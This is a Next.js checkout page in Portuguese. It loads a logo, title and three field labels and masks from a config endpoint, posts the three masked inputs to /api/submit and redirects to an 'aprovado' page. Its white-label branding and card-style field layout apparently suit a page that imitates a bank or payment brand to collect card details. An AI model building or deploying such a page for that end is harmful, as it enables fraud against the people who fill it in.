"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { remask, isComplete, getMaxChars, stripMask } from "@/lib/mask";

type PublicConfig = {
  logo_url: string | null;
  title: string;
  field1_label: string;
  field1_format: string;
  field2_label: string;
  field2_format: string;
  field3_label: string;
  field3_format: string;
  paragraphs: string[];
  footer_text: string;
};

export default function CheckoutPage() {
  const router = useRouter();
  const [config, setConfig] = useState<PublicConfig | null>(null);
  const [field1, setField1] = useState("");
  const [field2, setField2] = useState("");
  const [field3, setField3] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    fetch("/api/config", { cache: "no-store" })
      .then(async (r) => {
        const data = await r.json();
        if (!r.ok) throw new Error(data.error || "Erro ao carregar.");
        return data;
      })
      .then(setConfig)
      .catch(() => setError("Não foi possível carregar a página. Tente recarregar."));
  }, []);

  if (!config) {
    return (
      <div className="min-h-dvh flex items-center justify-center text-sm text-ink/50 px-6 text-center">
        {error ?? "Carregando…"}
      </div>
    );
  }

  const canSubmit =
    isComplete(field1, config.field1_format) &&
    isComplete(field2, config.field2_format) &&
    isComplete(field3, config.field3_format) &&
    !loading;

  async function handleSubmit() {
    setError(null);
    setLoading(true);
    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ field1, field2, field3 }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.error || "Não foi possível enviar.");
        setLoading(false);
        return;
      }
      router.push("/aprovado");
    } catch {
      setError("Falha de conexão. Tente novamente.");
      setLoading(false);
    }
  }

  return (
    <main className="min-h-dvh mx-auto max-w-[430px] flex flex-col">
      {/* Hero em onda vermelha */}
      <div className="relative h-[280px] shrink-0">
        <svg
          className="absolute inset-0 w-full h-full"
          viewBox="0 0 430 280"
          preserveAspectRatio="none"
        >
          <defs>
            <linearGradient id="crimson" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%" stopColor="#EC0F45" />
              <stop offset="100%" stopColor="#960A2E" />
            </linearGradient>
          </defs>
          <path
            d="M0,0 H430 V190 C 340,140 300,140 215,190 C 130,240 90,240 0,190 Z"
            fill="url(#crimson)"
          />
        </svg>

        {/* Cartão de vidro escuro com o logo, sobre a curva */}
        <div className="absolute left-1/2 -translate-x-1/2 top-[130px] w-[200px] aspect-square rounded-2xl bg-glass backdrop-blur-md shadow-glass border border-white/10 flex items-center justify-center overflow-hidden">
          {config.logo_url ? (
            <Image
              src={config.logo_url}
              alt="Logo"
              width={200}
              height={200}
              className="object-contain w-full h-full p-6"
            />
          ) : (
            <span className="text-white/40 text-xs font-mono text-center px-4">
              logo não configurada
            </span>
          )}
        </div>
      </div>

      {/* Corpo do formulário */}
      <div className="flex-1 px-6 pt-16 pb-8 flex flex-col gap-7">
        <h1 className="text-2xl font-bold leading-tight">{config.title}</h1>

        <Field
          label={config.field1_label}
          value={field1}
          format={config.field1_format}
          onChange={setField1}
        />

        <div className="grid grid-cols-2 gap-4">
          <Field
            label={config.field2_label}
            value={field2}
            format={config.field2_format}
            onChange={setField2}
          />
          <Field
            label={config.field3_label}
            value={field3}
            format={config.field3_format}
            onChange={setField3}
          />
        </div>

        {error && (
          <p role="alert" className="text-sm text-crimson-start font-medium">
            {error}
          </p>
        )}

        <button
          onClick={handleSubmit}
          disabled={!canSubmit}
          className="mt-1 w-full rounded-full bg-okgreen enabled:hover:bg-okgreendark active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed transition-all duration-150 text-white font-semibold text-lg py-4 shadow-lg shadow-okgreen/20"
        >
          {loading ? "Enviando…" : "Confirmar"}
        </button>

        <div className="flex flex-col gap-3 pt-4 text-sm text-ink/70 leading-relaxed">
          {config.paragraphs.map((p, i) => (
            <p key={i}>{p}</p>
          ))}
        </div>
      </div>

      <footer className="bg-neutral-600 text-white/70 text-xs leading-relaxed px-6 py-6">
        {config.footer_text}
      </footer>
    </main>
  );
}

function Field({
  label,
  value,
  format,
  onChange,
}: {
  label: string;
  value: string;
  format: string;
  onChange: (v: string) => void;
}) {
  const max = getMaxChars(format);
  return (
    <label className="flex flex-col gap-2">
      <span className="text-sm font-semibold text-ink/80">{label}</span>
      <input
        value={value}
        onChange={(e) => onChange(remask(e.target.value, format))}
        placeholder={format}
        maxLength={format.length}
        inputMode="text"
        className="font-mono text-base border-2 border-ink/15 focus:border-crimson-start rounded-lg px-4 py-3 placeholder:text-ink/25 transition-colors outline-none"
      />
      <span className="text-[11px] text-ink/35 font-mono self-end">
        {stripMask(value, format).length}/{max}
      </span>
    </label>
  );
}

